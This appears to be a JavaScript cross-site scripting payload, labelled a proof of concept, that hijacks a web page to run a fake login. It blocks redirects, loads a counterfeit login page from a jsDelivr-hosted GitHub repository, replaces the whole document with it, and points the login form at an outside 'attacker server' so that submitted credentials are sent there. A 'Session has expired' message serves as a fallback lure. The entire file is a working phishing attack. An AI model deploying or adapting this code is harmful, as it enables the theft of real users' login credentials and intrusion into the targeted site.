// fakelogin.js - Stable version for clean login.html

(function() {
    'use strict';

    // Safer way to block redirects
    const blockRedirects = () => {
        // Override dangerous methods safely
        const noop = () => {};
        
        try {
            Object.defineProperty(window, 'location', {
                value: {
                    href: window.location.href,
                    assign: noop,
                    replace: noop,
                    reload: noop
                },
                writable: false,
                configurable: true
            });
        } catch(e) {}

        // Block history changes
        history.pushState = history.replaceState = noop;

        // Block window.open
        window.open = noop;
    };

    // Run block early
    blockRedirects();

    // Load the clean fake login page
    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login1.html')
        .then(r => r.text())
        .then(html => {
            document.documentElement.innerHTML = html;

            setTimeout(() => {
                fixFormAction();
                console.log('%c[PoC SUCCESS] Clean GSSI Fake Login Page Loaded - No Redirect', 
                    'color: #FF3C00; font-size: 16px; font-weight: bold');
            }, 400);
        })
        .catch(err => {
            console.error('Load failed:', err);
            document.documentElement.innerHTML = `
                <h2 style="color:#FF3C00;text-align:center;margin-top:120px;font-family:Arial;">
                    Session has expired.<br>Please log in again.
                </h2>`;
        });
})();

// Force form to send credentials to your server
function fixFormAction() {
    const form = document.getElementById('DietaryLogin');
    if (form) {
        form.action = 'https://hackersrising.com/GPAPI/oauth/login';
        form.method = 'post';
        console.log('%c[PoC] Form action locked to attacker server', 'color: lime');
    }
}
